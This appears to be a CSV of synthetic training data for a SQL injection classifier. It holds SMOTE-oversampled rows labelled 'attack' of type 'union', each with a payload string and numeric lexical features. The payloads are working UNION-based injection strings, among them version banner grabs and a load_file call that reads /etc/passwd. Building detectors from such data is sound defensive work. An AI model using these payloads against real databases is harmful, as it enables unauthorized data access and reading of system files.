id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000032,attack,union,"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",nearest_attack_euclidean,R000124,0.7014802240276555,89.7423058852932,21.651538822941358,3.6243754976031513,14.0,42.696922354117284,16.696922354117284,16.348461177058642,0.15644613519962366,0.4759881228112458,0.18544530029765896,0.18212044169147157,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.674230588529321,1.0,0.0,8.674230588529321,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000229,0.01903351418619293,65.09966967601974,20.980066064796052,3.8781058040387046,14.0,36.07973574081579,4.0,11.019933935203948,0.2150779394584008,0.5541966406189706,0.06145083984525737,0.16927458007737134,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,7.019933935203949,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000034,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,1.470125125129273,102.0,25.415453920560317,4.053388635976426,64.33818431775873,4.415453920560317,24.0,9.246361761680946,0.6307665129192033,0.043288763927061935,0.23529411764705882,0.09065060550667595,1.246361761680947,0.0,2.0,0.0,2.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.0,0.4154539205603156,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000035,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000036,attack,union,"-5910%'   )    )     )   union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",nearest_attack_euclidean,R000078,0.12437210140324224,92.54357351064091,22.0,3.702504404775267,14.0,44.0,17.634858808512725,16.90871470212818,0.15131842263575604,0.4755721854266618,0.19040292595309716,0.18270646598448503,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.9087147021281816,1.0,0.0,9.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,union,"-3581'||  (  select 'uxmh' from dual where 8954  =  8954 union all select 8954,8954,8954,8954,8954,8954#",nearest_attack_euclidean,R000228,0.4507034007825543,101.9183096821628,30.167323872865122,4.2926263530245805,37.0,34.334647745730244,17.0,13.583661936432561,0.3632500526184903,0.33661074368668265,0.16689867282471177,0.1332405308701153,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.583661936432561,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000038,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R000291,0.23658160717315993,96.66272641394158,26.0,3.914896515455474,25.0,37.33018113115327,22.0,12.332545282788317,0.25899066061668774,0.3856149430132996,0.22791178134268522,0.12748261502732744,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,5.332545282788318,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000039,attack,union,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",nearest_attack_euclidean,R000172,0.4387479003083553,111.60702080490492,29.478595839019015,4.135794523942679,37.0,42.085616643923935,17.0,15.521404160980984,0.3320293716446118,0.3764382069830897,0.15255403562049732,0.13897838575180105,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,6.521404160980984,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000040,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000116,0.2413925456988133,106.506554449704,26.602621779881602,3.7942250624014853,25.0,45.205243559763204,22.0,14.301310889940801,0.2348342977279134,0.4242651236353385,0.20665418200056382,0.13424639663618423,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,7.301310889940801,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,union,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",nearest_attack_euclidean,R000213,0.8582127140585283,111.9532783026591,28.781311321063637,4.213913528139378,32.12524528425455,46.43737735787272,15.781311321063637,17.60934433946818,0.2863345383787262,0.41536396449315127,0.14084150757131333,0.1574599895568092,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,7.609344339468182,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.39065566053181844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.390655660531818
SMOTE_000042,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000155,0.3724810576923174,96.93807130951484,29.146903565475743,4.044913884657597,25.0,38.35045704761187,22.0,11.587614261902967,0.2591030437907922,0.39372642733603785,0.22801067853589713,0.11915985033727285,1.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,5.587614261902968,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000043,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000087,0.1572267908993518,60.0,18.282388428882705,3.554313213676487,14.0,32.0,4.0,10.0,0.23333333333333334,0.5333333333333333,0.06666666666666667,0.16666666666666666,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,6.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000113,0.15788734381852934,91.12594978049009,30.225189956098017,4.319068937254265,37.0,24.900759824392072,17.0,12.225189956098017,0.40623857989729434,0.27298778824134784,0.18665015833118928,0.13412347353016849,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,2.225189956098018,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000045,attack,union,"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#",nearest_attack_euclidean,R000072,0.8346371095527858,79.98162751736606,27.601224832175596,3.9859423103267275,25.0,24.785302013892856,22.0,8.196325503473215,0.315131993936509,0.3058730335075539,0.2773161546641279,0.10167881789180919,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,2.196325503473214,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,union,"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#",nearest_attack_euclidean,R000072,0.6949649871615369,73.77741125037038,27.554822500740755,3.980533883168701,25.0,20.0,22.0,6.777411250370378,0.3388679597816995,0.27109436782535956,0.29820380460789553,0.09183386778504542,0.0,0.7774112503703778,1.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,1.0,2.0,0.0,0.7774112503703781,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000135,0.9759845255599986,101.72907835457912,29.654184329084178,4.250111466065724,37.0,33.38326268366329,17.0,14.345815670915824,0.3656482393187151,0.32564552737031555,0.1680005423896799,0.14070569092128946,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.345815670915823,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000048,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000200,0.44502075149914483,73.01296496644892,24.602592993289782,4.096337936256587,27.0,26.41037197315913,11.0,8.602592993289782,0.3711874903403356,0.3600740855225652,0.1512245331016182,0.11751389103548097,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,4.602592993289782,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,union,-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#,nearest_attack_euclidean,R000153,0.23876079074786,80.63088482795564,30.326176965591127,4.394299296168739,37.0,17.304707862364506,17.0,9.326176965591127,0.45926119068198334,0.21413167026514557,0.21101189842145182,0.11559524063141927,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.3261769655911264,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000050,attack,union," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000035,0.9137381435201227,104.08462482323922,26.72637497474846,3.9515434883268474,62.0,4.273625025251537,29.084624823239228,8.726374974748461,0.5962219612120419,0.041229822125377014,0.2787637565983364,0.0837844600642447,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.4527499494969225,0.0,0.0,1.0,5.273625025251539,0.0,0.0,1.0,0.0,0.0,1.0,0.7263749747484612,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000051,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000052,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000004,0.8981057235737746,77.75940258774483,32.540099568709195,4.343729293063971,42.0,3.459900431290805,19.299502156454025,13.0,0.5409226487760852,0.04431511515779024,0.2473337971592411,0.1674284389068835,3.0,0.0,2.0,0.0,1.0,1.459900431290805,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000053,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000133,0.003484593190529487,54.975164780894815,19.00496704382104,3.821659282445522,14.0,27.98013182471585,4.0,8.995032956178962,0.25467188838817184,0.5089464132706607,0.07276339668233481,0.1636183016588326,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,4.995032956178963,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000222,0.03364076269790539,53.19472904326598,21.0,3.8387853621237937,14.0,16.077891617306395,14.077891617306395,9.038945808653198,0.2633344694202684,0.30219005421532885,0.2645708442981477,0.16990463206625503,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.019472904326599,1.0,0.0,2.019472904326599,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,union,"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000151,0.042908822290070946,114.69649984044658,27.060700031910685,3.978439171791875,72.75719987235726,9.0,17.0,15.939299968089315,0.6343267586536352,0.07847679853248862,0.14823395278358958,0.13896249003028666,3.0,0.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,7.9392999680893155,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000056,attack,union,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",nearest_attack_euclidean,R000172,0.4368183851044228,111.61754459256608,29.476491081486785,4.135476085406234,37.0,42.09403567405286,17.0,15.523508918513217,0.33199652918986633,0.3764801033037381,0.15253894584399263,0.13898442166240293,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,6.523508918513217,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000057,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000306,0.051874145945876415,93.67017569930559,28.06596486013888,4.190545204306477,29.0,35.73614055944447,15.0,13.934035139861118,0.3096539451016182,0.38143328800057125,0.1601658336732508,0.14874693322455973,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.934035139861119,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000058,attack,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",nearest_attack_euclidean,R000014,14.661212291592605,59.49388686081136,23.449388686081136,4.107892286275461,27.550611313918864,11.190218977298175,11.0,9.753056569594321,0.46698036088470474,0.17831790106521794,0.18617265581288814,0.16852908223718918,1.5506113139188642,0.0,0.4493886860811358,1.1012226278377282,2.7755575615628914e-17,0.0,0.5506113139188641,1.5506113139188642,0.0,0.5506113139188641,3.550611313918864,1.5506113139188642,1.0,0.0,0.0,0.4493886860811359,0.0,0.0,1.0,0.5506113139188641,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5506113139188641,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.550611313918864
SMOTE_000059,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000139,0.7621121883883053,81.1859505453488,28.61859505453488,4.28438062399511,33.948760436279045,20.0,16.23719010906976,11.0,0.41674736735777457,0.24725976299498414,0.2,0.13599286964724128,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,1.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.6185950545348804,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.618595054534881
SMOTE_000060,attack,union,"-8128""   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",nearest_attack_euclidean,R000160,0.2626341147309202,111.44339236910656,27.422643052357376,3.7871097205284054,25.0,49.15471389528524,22.0,15.288678473821312,0.22442017318358387,0.4409277229062658,0.1974897524015538,0.13716235150859651,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,8.288678473821312,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000061,attack,union,"-3326'+  (  select xitp where 7621  =  7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",nearest_attack_euclidean,R000108,0.1841006326250445,111.19727871633499,28.098639358167496,4.025753562602346,29.0,52.0,15.0,15.197278716334992,0.26080514368383045,0.467650602467558,0.13489921225025714,0.13664504159835442,1.197278716334992,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,9.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000062,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000043,0.04493858340112965,103.96038135192926,26.0,4.058651988451727,65.92076270385851,3.039618648070743,24.98019067596463,10.019809324035371,0.6340850444922657,0.029245776333292783,0.2402837760654308,0.09638540310901075,3.0,0.0,2.0,0.0,1.0198093240353712,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.019809324035371,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000063,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000298,0.007551290236668395,101.9450281223154,27.010994375536917,4.114173567316689,29.0,43.95602249785233,15.0,13.989005624463083,0.284474851875162,0.43116364032737614,0.14714216476301484,0.13721934303444702,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,6.989005624463083,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
